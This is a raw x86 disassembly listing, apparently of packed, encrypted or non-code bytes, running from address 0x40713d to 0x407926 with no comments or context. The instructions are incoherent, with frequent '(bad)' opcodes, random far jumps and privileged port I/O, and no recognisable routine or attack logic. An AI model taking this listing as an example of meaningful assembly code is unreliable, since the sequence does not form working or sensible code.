  40713d:	call   DWORD PTR [edx+0x48]
  407140:	inc    ecx
  407141:	add    al,BYTE PTR [esi]
  407143:	div    dl
  407145:	jb     0x40715d
  407147:	mov    ah,0x9c
  407149:	scas   eax,DWORD PTR es:[edi]
  40714a:	jo     0x407196
  40714c:	lahf   
  40714d:	xchg   edx,eax
  40714e:	inc    eax
  40714f:	jns    0x40711f
  407151:	mov    es,WORD PTR [ebx]
  407153:	mov    ah,0x4f
  407155:	retf   0x4932
  407158:	cs jmp 0x8e44f908
  40715e:	adc    BYTE PTR [esi+0x1c],0xa1
  407162:	fwait
  407163:	arpl   WORD PTR [edi],bp
  407165:	out    dx,al
  407166:	mov    WORD PTR [ebx+0x26e72e3e],es
  40716c:	in     eax,0x24
  40716e:	fdivr  st,st(7)
  407170:	pop    esi
  407171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407172:	dec    esp
  407173:	mov    esp,0xbae94806
  407178:	shr    DWORD PTR [edx],1
  40717a:	pop    ebx
  40717b:	jmp    0x4071a4
  40717d:	xchg   esp,eax
  40717e:	lahf   
  40717f:	fld    DWORD PTR [ecx-0x3de91c11]
  407185:	or     DWORD PTR [eax+0x79843ae7],esp
  40718b:	and    esp,DWORD PTR [ebp+0x41e54865]
  407191:	rcl    DWORD PTR [ecx+0x4ded783d],1
  407197:	test   dl,al
  407199:	xchg   edx,eax
  40719a:	xchg   ebp,eax
  40719b:	sar    BYTE PTR [ebx],1
  40719d:	loopne 0x4071e1
  40719f:	rcr    DWORD PTR [edx+0x23358177],cl
  4071a5:	dec    edx
  4071a6:	shl    DWORD PTR [ebx-0x1cc0c05c],1
  4071ac:	push   ss
  4071ad:	push   edi
  4071ae:	sbb    eax,0x962dc6b2
  4071b3:	dec    eax
  4071b4:	push   esp
  4071b5:	iret   
  4071b6:	sbb    eax,0x93958b67
  4071bb:	enter  0x5c5b,0xd5
  4071bf:	xchg   edi,eax
  4071c0:	xor    al,ah
  4071c2:	jmp    0xf2d21bde
  4071c7:	cmc    
  4071c8:	jne    0x4071fc
  4071ca:	mov    ds:0x442d4617,eax
  4071cf:	adc    DWORD PTR [esi],edi
  4071d1:	jmp    0xdcbc:0x45a72964
  4071d8:	ret    0xdc67
  4071db:	pop    eax
  4071dc:	call   0xe55e63b
  4071e1:	push   0xffffff92
  4071e3:	or     BYTE PTR [esi],0xdb
  4071e6:	cmp    BYTE PTR [esi-0x56018971],0xd9
  4071ed:	arpl   dx,bx
  4071ef:	mov    ds:0xd243158c,al
  4071f4:	imul   eax,DWORD PTR [esi+ebx*2+0x42],0x591c7bd4
  4071fc:	mov    ebx,0x1e4c3331
  407201:	sub    BYTE PTR [eax-0x3343e173],bh
  407207:	and    eax,0x299d0e57
  40720c:	sbb    di,WORD PTR [ecx]
  40720f:	ja     0x407263
  407211:	(bad)  
  407212:	or     ecx,DWORD PTR [ebp-0x54]
  407215:	js     0x4071cb
  407217:	sbb    eax,DWORD PTR [ebx]
  407219:	add    eax,0x11052d4
  40721e:	xchg   DWORD PTR [edi],ecx
  407220:	popa   
  407221:	pop    ds
  407222:	adc    BYTE PTR [ecx-0x3fe8d092],al
  407228:	cmp    ebp,ebp
  40722a:	add    BYTE PTR [eax+0x2b0554],dh
  407230:	lock cmp ecx,DWORD PTR [edx-0x6b6a1a3e]
  407237:	xchg   edi,eax
  407238:	jmp    0x4cb3deb9
  40723d:	cmp    ah,BYTE PTR [ebx+eax*2+0x4c]
  407241:	xchg   esi,eax
  407242:	aam    0xf4
  407244:	retf   0x5677
  407247:	mov    edx,0xc0b7244
  40724c:	inc    ebp
  40724d:	aaa    
  40724e:	sub    DWORD PTR [ebx],eax
  407250:	cmp    ch,BYTE PTR [edx-0x1ddac3d2]
  407256:	jae    0x407268
  407258:	xor    DWORD PTR [edi+0x518bb87c],ecx
  40725e:	pop    edi
  40725f:	mov    ecx,0xc5b070fe
  407264:	pop    edx
  407265:	push   ebx
  407266:	mov    esp,0xe7971790
  40726b:	mov    esp,0x9b268223
  407270:	jb     0x4072a4
  407272:	shl    DWORD PTR [eax+0xd],cl
  407275:	(bad)  
  407276:	test   al,0x37
  407278:	pop    ebp
  407279:	retf   
  40727a:	add    eax,DWORD PTR [edi-0x2b315eec]
  407280:	leave  
  407281:	adc    al,bl
  407283:	cs sahf 
  407285:	mov    ch,0x73
  407287:	popa   
  407288:	popf   
  407289:	inc    BYTE PTR [ecx]
  40728b:	cmp    eax,DWORD PTR [edi+0x33]
  40728e:	sbb    bh,bh
  407290:	fisttp QWORD PTR [ecx-0x532605a5]
  407296:	mov    esi,0x3ad86de3
  40729b:	xchg   esi,eax
  40729c:	dec    ebp
  40729d:	shr    DWORD PTR [esi],1
  40729f:	into   
  4072a0:	popf   
  4072a1:	lgs    ebp,FWORD PTR ds:0x7db24159
  4072a8:	mov    ebp,0x234bcb2b
  4072ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072ae:	cld    
  4072af:	inc    esp
  4072b0:	mov    fs,ebp
  4072b2:	pop    eax
  4072b3:	and    al,0xbb
  4072b5:	xchg   ebp,eax
  4072b6:	popf   
  4072b7:	in     al,0x1c
  4072b9:	cmp    BYTE PTR [eax-0x73],bl
  4072bc:	xor    DWORD PTR [ebx-0x5ed53293],ecx
  4072c2:	push   es
  4072c3:	loope  0x407260
  4072c5:	xor    cl,dh
  4072c7:	inc    ebx
  4072c8:	or     BYTE PTR [edx-0x40],cl
  4072cb:	(bad)  
  4072cc:	pop    ebp
  4072cd:	mov    esi,gs
  4072cf:	mov    ds:0x34e747aa,al
  4072d4:	xor    DWORD PTR [ebx+0x32],esp
  4072d7:	or     eax,0xeb7c4a28
  4072dc:	push   es
  4072dd:	jmp    0x407333
  4072df:	stos   BYTE PTR es:[edi],al
  4072e0:	sub    DWORD PTR [edx-0x36217cce],eax
  4072e6:	(bad)  
  4072e7:	jb     0x40727c
  4072e9:	add    DWORD PTR [ecx],edi
  4072eb:	inc    ecx
  4072ec:	je     0x4072f8
  4072ee:	add    al,0x52
  4072f0:	mov    ecx,0xdec9e7fc
  4072f5:	sub    dh,BYTE PTR [eax-0x48515450]
  4072fb:	inc    edx
  4072fc:	xlat   BYTE PTR ds:[ebx]
  4072fd:	ret    0x147e
  407300:	jno    0x407345
  407302:	sub    ch,cl
  407304:	xchg   ebx,eax
  407305:	pushf  
  407306:	inc    edx
  407307:	les    esi,FWORD PTR [ebx]
  407309:	data16 das 
  40730b:	mov    DWORD PTR [ebx],eax
  40730d:	xchg   BYTE PTR [ebx-0x5ed8870],dh
  407313:	dec    edi
  407314:	pushf  
  407315:	(bad)  
  407316:	or     al,0x9c
  407318:	sbb    edi,DWORD PTR [ebp+0x44]
  40731b:	ficom  WORD PTR [esi]
  40731d:	add    edx,ebp
  40731f:	mov    ecx,0x230d4b5f
  407324:	loope  0x40731c
  407326:	rcl    dh,1
  407328:	(bad)  
  407329:	loopne 0x4072b4
  40732b:	sub    edx,DWORD PTR fs:[ebx+0x6c]
  40732f:	mov    cl,0x86
  407331:	retf   
  407332:	inc    ebp
  407333:	data16 cmp bl,0x9a
  407337:	test   eax,0xce731c35
  40733c:	popa   
  40733d:	fwait
  40733e:	mov    esi,0xcf24e55d
  407343:	inc    ebx
  407344:	mov    edi,DWORD PTR [ebp+0x76]
  407347:	adc    DWORD PTR [edx-0x2b],ebx
  40734a:	arpl   bx,bp
  40734c:	mov    ds:0x3be9e550,eax
  407351:	cwde   
  407352:	pop    esp
  407353:	sbb    dh,BYTE PTR [edi]
  407355:	pop    ds
  407356:	fsub   QWORD PTR [ecx+eax*2+0x4a56c633]
  40735d:	xchg   edx,eax
  40735e:	ss sbb al,0xa1
  407361:	adc    eax,0x74b72339
  407367:	mov    ds:0x7e84a46a,eax
  40736c:	(bad)  
  40736d:	sbb    eax,ebp
  40736f:	lea    edi,[esi-0x35]
  407372:	xchg   edx,eax
  407373:	retf   0xd116
  407376:	push   eax
  407377:	bound  ebx,QWORD PTR [eax-0x67cc00b9]
  40737d:	(bad)  
  40737e:	aas    
  40737f:	and    eax,0x94bfb683
  407384:	ins    DWORD PTR es:[edi],dx
  407385:	repz aaa 
  407387:	pop    eax
  407388:	or     BYTE PTR [ecx+0x23],ch
  40738b:	jmp    DWORD PTR [ecx+0x22]
  40738e:	lock scas al,BYTE PTR es:[di]
  407391:	(bad)  
  407392:	cwde   
  407393:	mov    edi,0x77daa502
  407398:	xchg   ebx,eax
  40739a:	sahf   
  40739b:	dec    eax
  40739c:	test   ebp,ebx
  40739e:	xchg   ecx,eax
  40739f:	mov    al,0x69
  4073a1:	sbb    al,0x5
  4073a3:	es jmp 0x4073d0
  4073a6:	xchg   BYTE PTR [eax-0x486c3e91],bl
  4073ac:	or     edx,esi
  4073ae:	adc    BYTE PTR [edi-0x58],dh
  4073b1:	aaa    
  4073b2:	cwde   
  4073b3:	inc    ebp
  4073b4:	loope  0x40737a
  4073b6:	and    ebp,0x53eb4147
  4073bc:	adc    DWORD PTR [eax-0x5fb4be9e],esp
  4073c2:	in     eax,dx
  4073c3:	jmp    0x40743a
  4073c5:	push   eax
  4073c6:	out    dx,al
  4073c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073c8:	and    eax,DWORD PTR [edx-0x7b]
  4073cb:	push   esp
  4073cc:	je     0x4073e8
  4073ce:	inc    ebp
  4073cf:	pop    ebp
  4073d0:	push   ss
  4073d1:	imul   ebp,ebp,0xffffffaf
  4073d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073d5:	pop    eax
  4073d6:	jmp    0xea3e:0x148a3ab7
  4073dd:	mov    ebp,0x9ff3740
  4073e2:	sub    eax,0xeaac70f
  4073e7:	jmp    0xb219db95
  4073ec:	fs pushf 
  4073ee:	(bad)  
  4073ef:	into   
  4073f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073f1:	jmp    0x1e77:0x6b2ce8cd
  4073f8:	pop    edi
  4073f9:	fwait
  4073fa:	(bad)  
  4073fb:	loopne 0x40742e
  4073fd:	mov    eax,ds:0xe3d79491
  407402:	jge    0x4073e9
  407404:	and    DWORD PTR [edi-0x1],eax
  407407:	test   eax,0x952a8a21
  40740c:	sbb    al,0x30
  40740e:	adc    al,0x48
  407410:	lods   al,BYTE PTR ds:[esi]
  407411:	stos   BYTE PTR es:[edi],al
  407412:	test   bh,ah
  407414:	int    0x21
  407416:	icebp  
  407417:	mov    BYTE PTR [ebp-0x7b],0xa5
  40741b:	scas   al,BYTE PTR es:[edi]
  40741c:	add    BYTE PTR [edi+ebp*4-0x7aaa2422],dl
  407423:	stc    
  407424:	aad    0xed
  407426:	mov    bh,0x54
  407428:	repnz or DWORD PTR cs:[edi],0xffffff89
  40742d:	(bad)  
  40742e:	mov    ebx,0xb3dc355e
  407433:	(bad)  
  407434:	dec    ebp
  407435:	mov    cl,0x27
  407437:	cs loop 0x407422
  40743a:	(bad)  
  40743b:	loope  0x407479
  40743d:	push   ss
  40743e:	shr    BYTE PTR [edi-0xf],cl
  407441:	and    dh,BYTE PTR [ebp+edi*2+0x6cee3912]
  407448:	retf   0x109d
  40744b:	cmp    DWORD PTR [esi],esi
  40744d:	mov    ss,WORD PTR [edx]
  40744f:	pop    esp
  407450:	mov    ebx,0x9244efa0
  407455:	xchg   edi,eax
  407456:	push   cs
  407457:	add    al,0xe2
  407459:	imul   ecx,DWORD PTR [ecx],0xda7647fb
  40745f:	mov    ?,WORD PTR [edx+0x7d]
  407462:	je     0x4073f9
  407464:	jno    0x4074a7
  407466:	loope  0x4073eb
  407468:	mov    ss,WORD PTR [ebp-0x7d]
  40746b:	nop
  40746c:	push   es
  40746d:	jnp    0x407491
  40746f:	pusha  
  407470:	loope  0x40747d
  407472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407473:	push   ecx
  407474:	aas    
  407475:	cmc    
  407476:	dec    di
  407478:	int    0xd0
  40747a:	jmp    0xf804552c
  40747f:	(bad)  
  407480:	jmp    0x5cee9e7
  407485:	cmc    
  407486:	neg    DWORD PTR [ebx-0x35e00c99]
  40748c:	add    eax,0xa4d1ddbe
  407491:	fcom   DWORD PTR [ebx+0x4a]
  407494:	cmp    edx,DWORD PTR [eax+0x5e]
  407497:	xor    BYTE PTR [ecx+ebp*1-0x1aa6c47],0x6f
  40749f:	mov    esi,0x536ed1ce
  4074a4:	lahf   
  4074a5:	dec    edx
  4074a6:	(bad)  
  4074a7:	and    ebx,DWORD PTR [ebx+0x49]
  4074aa:	jne    0x40744a
  4074ac:	adc    BYTE PTR [ecx],dh
  4074ae:	add    al,0x82
  4074b0:	cmc    
  4074b1:	ja     0x407479
  4074b3:	sti    
  4074b4:	jb     0x40744f
  4074b6:	ss cli 
  4074b8:	dec    ebx
  4074b9:	enter  0x6e6c,0x49
  4074bd:	pop    ds
  4074be:	mov    WORD PTR [ecx],fs
  4074c0:	icebp  
  4074c1:	jb     0x407516
  4074c3:	or     al,0xe0
  4074c5:	sub    BYTE PTR [eax],dh
  4074c7:	xor    DWORD PTR [esp+ebx*4+0x49],ebx
  4074cb:	dec    ebx
  4074cc:	jb     0x40754a
  4074ce:	dec    ebx
  4074cf:	jp     0x407452
  4074d1:	stc    
  4074d2:	icebp  
  4074d3:	dec    ecx
  4074d4:	jecxz  0x407517
  4074d6:	jns    0x4074b0
  4074d8:	mov    al,ds:0xf804ff29
  4074dd:	jae    0x40751f
  4074df:	pushf  
  4074e0:	sub    DWORD PTR [ebp-0x4b3811e4],edx
  4074e6:	shr    BYTE PTR gs:[ecx-0x2eb08211],cl
  4074ed:	mov    ecx,0xec65076f
  4074f2:	inc    eax
  4074f3:	lods   al,BYTE PTR ds:[esi]
  4074f4:	jmp    DWORD PTR [eax]
  4074f6:	xchg   ebp,eax
  4074f7:	jp     0x40747f
  4074f9:	push   cs
  4074fa:	scas   al,BYTE PTR es:[edi]
  4074fb:	add    bh,BYTE PTR [edx+0x6f]
  4074fe:	lds    eax,FWORD PTR ds:[esi+0x3f]
  407502:	jo     0x407548
  407504:	scas   eax,DWORD PTR es:[edi]
  407505:	repz add DWORD PTR [edi+0x5b],edx
  407509:	mov    ds:0x7428d063,eax
  40750e:	icebp  
  40750f:	(bad)  
  407510:	cwde   
  407511:	mov    ?,WORD PTR [edi]
  407513:	xchg   edx,eax
  407514:	mov    eax,ds:0x42928c3b
  407519:	(bad)  
  40751a:	(bad)  
  40751b:	adc    al,0xd7
  40751d:	cmp    al,0xc3
  40751f:	push   es
  407520:	jp     0x407512
  407522:	mov    edi,0xcd5f96d9
  407527:	sar    DWORD PTR [esp+eax*8],cl
  40752a:	sbb    al,0x0
  40752c:	scas   al,BYTE PTR es:[edi]
  40752d:	or     eax,0xeeb75cfa
  407532:	cmp    ecx,DWORD PTR [ecx+0x5943420a]
  407538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407539:	retf   0xf680
  40753c:	test   BYTE PTR [esi+0x5e008928],cl
  407542:	xchg   DWORD PTR [ecx+ebp*4-0x57],ecx
  407546:	cs ins BYTE PTR es:[edi],dx
  407548:	js     0x407524
  40754a:	sbb    eax,0x1baaa572
  40754f:	sbb    ah,ah
  407551:	cmc    
  407552:	adc    DWORD PTR ds:0x4ea7a57c,0x6e
  407559:	imul   edi,DWORD PTR [edx+0x35],0x75ae0aed
  407560:	inc    edi
  407561:	xor    ch,ch
  407563:	fidivr WORD PTR [ebp+0x7c559f98]
  407569:	loop   0x407585
  40756b:	and    eax,0x68d9709f
  407570:	push   cs
  407571:	popa   
  407572:	(bad)  
  407574:	jb     0x40754a
  407576:	loop   0x4075a2
  407578:	lea    esi,[edx+0x3fab34a5]
  40757e:	pop    eax
  40757f:	js     0x407521
  407581:	pop    eax
  407582:	add    DWORD PTR [ebp+0x5b],eax
  407585:	(bad)  
  407586:	jb     0x4075a4
  407588:	inc    ebx
  407589:	mov    al,ds:0x12c97fef
  40758e:	mov    eax,ds:0x88f91564
  407593:	mov    BYTE PTR [ecx],dh
  407595:	ins    BYTE PTR es:[edi],dx
  407596:	mov    edx,0x8ee5211b
  40759b:	stc    
  40759c:	pop    ds
  40759d:	icebp  
  40759e:	add    bx,sp
  4075a1:	daa    
  4075a2:	lds    ebp,FWORD PTR ds:0xd0a57ad
  4075a8:	jmp    0x570f56c8
  4075ad:	add    edi,DWORD PTR [ebx-0x32]
  4075b0:	mov    bh,0x8c
  4075b2:	adc    dl,cl
  4075b4:	mov    cl,0x93
  4075b6:	lods   al,BYTE PTR ds:[esi]
  4075b7:	xchg   ecx,eax
  4075b8:	lods   al,BYTE PTR ds:[esi]
  4075b9:	add    DWORD PTR [ecx+ecx*1],ebp
  4075bc:	vmovhpd xmm1,xmm0,QWORD PTR [eax-0x66]
  4075c1:	add    al,cl
  4075c3:	call   0x4716408f
  4075c8:	dec    ebp
  4075c9:	jo     0x407599
  4075cb:	cmp    dl,BYTE PTR [eax+0x51f6fbb7]
  4075d1:	jne    0x407585
  4075d3:	mov    DWORD PTR [edi-0x4ff71842],edx
  4075d9:	ins    BYTE PTR es:[edi],dx
  4075da:	jmp    0x971d:0x6c470efe
  4075e1:	popa   
  4075e2:	add    al,0x1c
  4075e4:	test   DWORD PTR [ebx],ecx
  4075e6:	push   edx
  4075e7:	mov    DWORD PTR [edx+0x37],0x608338af
  4075ee:	int3   
  4075ef:	push   0xf76359f4
  4075f4:	or     edx,eax
  4075f6:	mov    dh,0x61
  4075f8:	mov    ecx,DWORD PTR [esi+0x52]
  4075fb:	(bad)  
  4075fc:	jmp    0x5c40:0xeeebc7d4
  407603:	adc    al,0xc1
  407605:	and    eax,0xea52b465
  40760a:	and    bl,bh
  40760c:	das    
  40760d:	xchg   esp,eax
  40760e:	mov    ecx,0x82092915
  407613:	(bad)  
  407614:	hlt    
  407615:	mov    ecx,0x655a6f9f
  40761a:	aaa    
  40761b:	cmp    edx,DWORD PTR [edi+0x45c5d700]
  407621:	adc    BYTE PTR ds:0x32195e2b,ah
  407627:	fcmovnu st,st(5)
  407629:	pushf  
  40762a:	cmp    ebp,DWORD PTR [esi-0x32]
  40762d:	add    edx,ebp
  40762f:	xchg   edx,eax
  407630:	bound  esp,QWORD PTR [esi+eax*8-0x61259ebe]
  407637:	mov    ds:0x8f5f4596,al
  40763c:	push   eax
  40763d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40763e:	mov    ds:0xcd80a29f,eax
  407643:	and    edi,DWORD PTR [ecx]
  407645:	pop    edi
  407646:	out    dx,al
  407647:	or     esp,ebp
  407649:	sar    BYTE PTR [esi-0x6c],cl
  40764c:	dec    ebx
  40764d:	cmp    BYTE PTR [eax-0x58],bl
  407650:	mov    edi,0x74d7a052
  407655:	mov    ebp,0xef6b9652
  40765a:	mov    bl,0x87
  40765c:	sahf   
  40765d:	ss xchg esi,eax
  40765f:	imul   BYTE PTR [ecx+eiz*8+0x7e5d8987]
  407666:	xchg   edi,eax
  407667:	inc    edx
  407668:	push   ss
  407669:	cmp    cl,BYTE PTR [ecx]
  40766b:	cmp    bl,ch
  40766d:	mov    BYTE PTR [edx-0x2532cd81],cl
  407673:	sbb    ah,BYTE PTR [ecx+0x4e]
  407676:	int    0xcb
  407678:	xchg   BYTE PTR [edi-0x40],bh
  40767b:	ins    DWORD PTR es:[edi],dx
  40767c:	push   cs
  40767d:	add    BYTE PTR [edi],bl
  40767f:	scas   al,BYTE PTR es:[edi]
  407680:	sahf   
  407681:	pop    edx
  407682:	repz jg 0x40764f
  407685:	in     eax,dx
  407686:	inc    eax
  407687:	sbb    al,0xc4
  407689:	mov    al,ds:0x9a9ba3d4
  40768e:	stos   DWORD PTR es:[edi],eax
  40768f:	add    edx,esp
  407691:	out    dx,al
  407692:	stc    
  407693:	stc    
  407694:	inc    ebp
  407695:	and    bl,BYTE PTR [esi-0x51]
  407698:	push   eax
  407699:	call   0x83a1a98b
  40769e:	push   ebx
  40769f:	lahf   
  4076a0:	ror    BYTE PTR [edx+0x48],0xea
  4076a4:	test   ecx,0x65412266
  4076aa:	cmp    ch,BYTE PTR [eax]
  4076ac:	add    eax,0xec18b46a
  4076b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076b2:	push   esi
  4076b3:	or     dl,BYTE PTR ds:0x1a02272b
  4076b9:	lock js 0x407731
  4076bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076bd:	and    dh,BYTE PTR [eax+0x4b6c8eb2]
  4076c3:	data16 out 0xe,al
  4076c6:	leave  
  4076c7:	out    0x6b,eax
  4076c9:	xchg   edi,eax
  4076ca:	push   ecx
  4076cb:	push   cs
  4076cc:	or     al,0x77
  4076ce:	mov    al,0x77
  4076d0:	mov    ebx,0x5daeedef
  4076d5:	mov    dh,0xc0
  4076d7:	dec    edx
  4076d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076d9:	sahf   
  4076da:	sbb    DWORD PTR [edx+0x6a],esp
  4076dd:	ss and al,0xe5
  4076e0:	dec    ebp
  4076e1:	sti    
  4076e2:	cli    
  4076e3:	mov    al,ds:0x1088d52c
  4076e8:	daa    
  4076e9:	aas    
  4076ea:	xchg   esi,eax
  4076eb:	jnp    0x407710
  4076ed:	fwait
  4076ee:	dec    edi
  4076ef:	outs   dx,DWORD PTR ds:[esi]
  4076f0:	or     BYTE PTR [edi+0x404b92fe],bh
  4076f6:	fadd   DWORD PTR [ebp-0x18699c7e]
  4076fc:	cmp    ebx,esp
  4076fe:	and    eax,0xe6d500b3
  407703:	pusha  
  407704:	inc    ebp
  407705:	rcr    BYTE PTR [edi+0x4afb4401],1
  40770b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40770c:	cmp    eax,0x2828e783
  407711:	pop    edx
  407712:	mov    dh,BYTE PTR [edx]
  407714:	jmp    0x157421c
  407719:	mov    ebx,0x4281ac3
  40771e:	data16 int3 
  407720:	popa   
  407721:	dec    edx
  407722:	test   eax,ebp
  407724:	jno    0x4076dc
  407726:	cmp    bl,BYTE PTR [edi-0x67f4a371]
  40772c:	pop    ecx
  40772e:	repnz icebp 
  407730:	inc    ecx
  407731:	pop    ebx
  407732:	xchg   esi,eax
  407733:	icebp  
  407734:	push   0x50e6f1e3
  407739:	nop    DWORD PTR [esi]
  40773c:	mov    BYTE PTR ss:[eax-0x5a38bdae],dh
  407743:	xchg   edi,eax
  407744:	out    dx,eax
  407745:	mov    eax,ds:0x40d8aaf0
  40774a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40774b:	adc    eax,ecx
  40774d:	mov    cl,0x8b
  40774f:	and    dh,BYTE PTR [ecx-0x64]
  407752:	adc    ebx,DWORD PTR [edi+edi*8]
  407755:	and    BYTE PTR [ebp-0x21],al
  407758:	push   ebp
  407759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40775a:	lock and dh,BYTE PTR [esi+ecx*2-0x55]
  40775f:	adc    ebx,0x5cf6c081
  407765:	loopne 0x4077bd
  407767:	xchg   edx,eax
  407768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407769:	mov    DWORD PTR [esi+0x26],ebx
  40776c:	xor    BYTE PTR [edx+0x20],dh
  40776f:	xchg   ebx,eax
  407770:	fdiv   DWORD PTR [edi+ebp*1]
  407773:	or     eax,0x78ce5f3b
  407778:	gs paddusw mm7,mm6
  40777c:	inc    DWORD PTR [edi+0x75]
  40777f:	push   ds
  407780:	shl    DWORD PTR [ebp+ebx*4-0x4b],cl
  407784:	cmp    edi,eax
  407786:	xchg   edx,eax
  407787:	popa   
  407788:	sbb    DWORD PTR [edx+eiz*2+0x7c82cccd],ebp
  40778f:	in     eax,dx
  407790:	and    BYTE PTR [ebp+0x22],dh
  407793:	xlat   BYTE PTR ds:[ebx]
  407794:	push   ecx
  407795:	push   eax
  407796:	rcl    esp,cl
  407798:	mov    ecx,0xf4fa9a78
  40779d:	test   BYTE PTR ds:0xcf2a2bea,dl
  4077a3:	fdivr  st,st(7)
  4077a5:	push   es
  4077a6:	or     esp,DWORD PTR [esi]
  4077a8:	pop    esp
  4077a9:	test   al,0x78
  4077ab:	add    al,0x47
  4077ad:	pop    ss
  4077ae:	and    ebp,eax
  4077b0:	je     0x4077f8
  4077b2:	inc    esp
  4077b3:	cwde   
  4077b4:	dec    ebp
  4077b5:	les    ecx,FWORD PTR [eax-0x444e4b73]
  4077bb:	hlt    
  4077bc:	fistp  WORD PTR [edi+0x7a]
  4077bf:	mov    ds:0x6f067523,eax
  4077c4:	mov    edx,0xe114d356
  4077c9:	pushf  
  4077ca:	das    
  4077cb:	sub    BYTE PTR [eax],dl
  4077cd:	into   
  4077ce:	lods   eax,DWORD PTR ds:[esi]
  4077cf:	loope  0x40781f
  4077d1:	push   0x89e4c978
  4077d6:	imul   edi,DWORD PTR [ebp-0x54d48e1f],0xffffff89
  4077dd:	(bad)  
  4077de:	jmp    0x2d084422
  4077e3:	ds jno 0x407861
  4077e6:	or     esi,DWORD PTR [edi]
  4077e8:	ja     0x4077f0
  4077ea:	ins    BYTE PTR es:[edi],dx
  4077eb:	mov    ah,BYTE PTR [eax+0x5589a610]
  4077f1:	dec    edx
  4077f2:	push   ds
  4077f3:	xor    dh,dh
  4077f5:	hlt    
  4077f6:	dec    esi
  4077f7:	jbe    0x407837
  4077f9:	or     al,0x13
  4077fb:	inc    ebx
  4077fc:	mov    esi,0x15413063
  407801:	mov    dh,0x47
  407803:	jecxz  0x407877
  407805:	adc    BYTE PTR [esi+0x54],bh
  407808:	pop    ebx
  407809:	clc    
  40780a:	cmp    DWORD PTR [ecx],0xffffff92
  40780d:	ret    0xa7df
  407810:	mov    ebp,0x60154508
  407815:	pop    ebx
  407816:	jbe    0x4077c3
  407818:	push   ss
  407819:	add    DWORD PTR [edi+0xb119bb],esp
  40781f:	or     dl,ch
  407821:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  407823:	leave  
  407824:	mov    bh,0x68
  407826:	sub    edi,DWORD PTR [eax]
  407828:	jno    0x40780e
  40782a:	cli    
  40782b:	ja     0x40784f
  40782d:	ret    0xaa4b
  407830:	mov    ebp,0xb8738a8a
  407835:	mov    eax,0xd4893dd3
  40783a:	mov    cl,0x71
  40783c:	(bad)  
  40783d:	(bad)  [eax]
  40783f:	cld    
  407840:	retf   0x7ff5
  407843:	xchg   edx,eax
  407844:	pop    es
  407845:	dec    esi
  407846:	shl    DWORD PTR [esi+eiz*1],1
  407849:	inc    edx
  40784a:	stc    
  40784b:	bound  edi,QWORD PTR [edi-0x1c]
  40784e:	xor    eax,0xe2f2ae7
  407853:	push   ebx
  407854:	push   0x63
  407856:	ins    BYTE PTR es:[edi],dx
  407857:	dec    edi
  407858:	dec    edx
  407859:	ss or  eax,0x4415960e
  40785f:	sbb    DWORD PTR [ebp-0x32],esi
  407862:	gs mov ebx,0x193bdb4d
  407868:	push   0xffffffca
  40786a:	sahf   
  40786b:	dec    ebp
  40786c:	or     ebx,DWORD PTR [ebp+0x5002ae70]
  407872:	es push ebx
  407874:	or     ah,BYTE PTR [edi]
  407876:	int3   
  407877:	adc    ecx,DWORD PTR [esi]
  407879:	and    edi,DWORD PTR [edx]
  40787b:	xor    BYTE PTR [ebx+0x45e4e506],ch
  407881:	outs   dx,BYTE PTR ds:[esi]
  407882:	add    ecx,ebp
  407884:	jg     0x407840
  407886:	jo     0x407830
  407888:	pop    ecx
  407889:	push   eax
  40788a:	je     0x40789c
  40788c:	mov    ebx,0xd4276c6f
  407891:	cmc    
  407892:	ins    DWORD PTR es:[edi],dx
  407893:	fcomp  QWORD PTR [edx+0x6f]
  407896:	fdivr  DWORD PTR [ebp-0x613ed51f]
  40789c:	dec    esp
  40789d:	mov    ds:0xf3d2f021,al
  4078a2:	jbe    0x407865
  4078a4:	mov    esi,0x2113a714
  4078a9:	pop    esp
  4078aa:	(bad)  
  4078ac:	aas    
  4078ad:	xchg   edi,eax
  4078ae:	fild   WORD PTR [edi-0x2b]
  4078b1:	ds mov gs,edx
  4078b4:	ja     0x4078e8
  4078b6:	popa   
  4078b7:	push   ss
  4078b8:	call   0xc645:0xe7457758
  4078bf:	lock mov ds:0x72a7bf9b,al
  4078c5:	outs   dx,BYTE PTR ds:[esi]
  4078c6:	(bad)  
  4078c7:	fs mov dl,0x49
  4078ca:	daa    
  4078cb:	jno    0x407863
  4078cd:	sbb    cl,0x8d
  4078d0:	or     eax,0x3afa9760
  4078d5:	retf   0x6067
  4078d8:	jmp    0x1dc0db74
  4078dd:	stos   DWORD PTR es:[edi],eax
  4078de:	add    dl,BYTE PTR [edi+0x1487b27]
  4078e4:	push   edi
  4078e5:	sar    BYTE PTR [ebx+0x3c],1
  4078e8:	cli    
  4078e9:	and    al,0xa6
  4078eb:	or     eax,esp
  4078ed:	mov    al,cs:0xd22b3923
  4078f3:	enter  0xf05e,0xf4
  4078f7:	push   edi
  4078f8:	push   edx
  4078f9:	cwde   
  4078fa:	inc    edx
  4078fb:	pop    ebp
  4078fc:	(bad)  
  4078fd:	push   0x11
  4078ff:	out    dx,al
  407900:	pop    esi
  407901:	js     0x40795e
  407903:	call   0xbcab:0x48d9d8b1
  40790a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40790b:	sub    ecx,DWORD PTR [edi+0x75]
  40790e:	lods   al,BYTE PTR ds:[esi]
  40790f:	add    bh,BYTE PTR [esi]
  407911:	jns    0x4078ce
  407913:	dec    edi
  407914:	and    ch,bh
  407916:	or     ch,al
  407918:	je     0x40797a
  40791a:	sbb    bl,BYTE PTR [eax]
  40791c:	mov    al,0xb2
  40791e:	xor    DWORD PTR [edi-0x7583d949],edx
  407924:	jp     0x4078c7
  407926:	jno    0x407931
